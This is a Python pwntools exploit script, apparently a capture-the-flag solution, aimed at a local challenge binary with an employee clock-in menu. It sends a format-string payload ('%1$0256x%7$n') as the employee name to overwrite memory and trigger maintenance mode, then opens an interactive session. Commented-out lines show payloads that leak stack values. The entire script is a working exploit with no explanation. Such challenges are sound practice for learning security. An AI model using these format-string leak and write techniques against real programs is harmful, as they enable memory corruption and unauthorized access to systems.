#!/usr/bin/env python3

from pwn import *

io = process('./bin/challenge')
#io = gdb.debug('./bin/challenge')

def menu(io, choice):
    io.recvline_contains(b'5) Maintenance mode')
    io.sendline(f'{choice}'.encode())


def clock_in(io, name):
    menu(io, 2)
    io.recvline_contains(b'Employee name:')
    io.sendline(name)


def show_employee(io):
    menu(io, 4)

def maintenance_mode(io):
    menu(io, 5)


#name = ''
#name += '%1$lx|'
#name += '.'.join(f'%{i}$lx' for i in range(1, 10))

name = '%1$0256x%7$n'
clock_in(io, name.encode())
show_employee(io)
maintenance_mode(io)

io.interactive()
